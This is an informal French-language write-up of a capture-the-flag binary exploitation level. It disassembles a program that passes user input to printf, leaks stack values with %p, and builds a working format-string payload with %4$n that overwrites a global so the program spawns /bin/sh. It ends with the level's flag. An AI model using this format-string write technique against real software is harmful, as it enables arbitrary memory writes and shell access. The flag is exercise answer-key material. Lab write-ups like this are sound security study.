i function

2 fonctions => main et v


Stack dans V :

esp < -536 > sauvegarde eax (adresse ebp-520)
^
|
| < -532 > 512
|    |
|    |  < -528 > stdin
|    |     |
|    |     |
|    |     |  < -524 >
|    |     |     |
|    |     |     |
|    |     |     |   < -520 > adresse sauvegardee dans eax puis esp
|    |     |     |      |
|    |     |     |      |
|    |     |     |      |
|    |     |     |      |
|    |     |     |      |
ebp < +0 >
|    |
| < +4 > eip
|    |
|    V



fonction stdin stockée dans eax
eax stocké dans ebp-528 => à ebp-528, on a l'adresse de stdin stockée

on stock la valeur 512 à ebp-532

on charge dans eax l'adresse ebp-520

on met la valeur d'eax dans esp => esp vaut l'adresse ebp-520

on appele fgets (buffer, size, inputstream)
  => Ici fgets(esp, esp+4, esp+8) <=> fgets(ebp-520, 512, stdin)
  Vérification :
      input => "BBBBBBBB"
      x/2xw $ebp-520 => 42424242 42424242


on charge dans eax l'adresse ebp-520

on met la valeur d'eax dans esp => esp vaut l'adresse ebp-520

printf de la string ? (printf("%s"), str)

on met <m> ("" ou 0) ? dans eax

on compare eax avec 64

  si pas = à 64 => terminé, on leave la fonction

  sinon :

    fwrite("Wait what?!\n", 1, 12, stdout)
    system("/bin/sh")



Donc pour y accéder la valeur d'eax doit être à 64 lors de la comparaison :

   0x080484da <+54>:    mov    eax,ds:0x804988c
   0x080484df <+59>:    cmp    eax,0x40

=> la valeur à l'adresse 0x804988c doit être 64


./level3
BBBB %p %p %p %p %p
=> BBBB 0x200 0xb7fd1ac0 0xb7ff37d0 0x42424242 0x20702520

"BBBB" est sur la stack : 4ème argument sur la pile

./level3
BBBB%4$p
=> BBBB0x42424242


Utilisation de %n => stocke le nombre de char écrits précédemment dans l'argument fourni (pointeur)

printf("test %n test\n", &val); => va stocker la longueur de la chaine "test " (le nombre de char imprimés avant %n) à l'adresse de val

si on envoie à printf : ("test %n", 0x804988c) => il va stocker 5 à l'adresse 0x804988c

Dans notre cas, l'adresse est stockée sur l'argument #4 donc il faut envoyer à printf : "adresse%4$n" => on aura donc 7 à la valeur 'adresse'
En remplacant "adresse" par notre adresse, on a alors => "\x8c\x98\x04\x08%4$n" => et on a donc 4 à l'adresse 0x804988c
Et pour passer de 4 à 64, on rajoute 60 chars => '\x8c\x98\x04\x08'+ 'B' * 60 + '%4$n'

On exécute ./level3 avec cette chaine en entrée => (python -c "print ('\x8c\x98\x04\x08'+ 'B' * 60 + '%4\$n')"; cat) | ./level3

flag : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
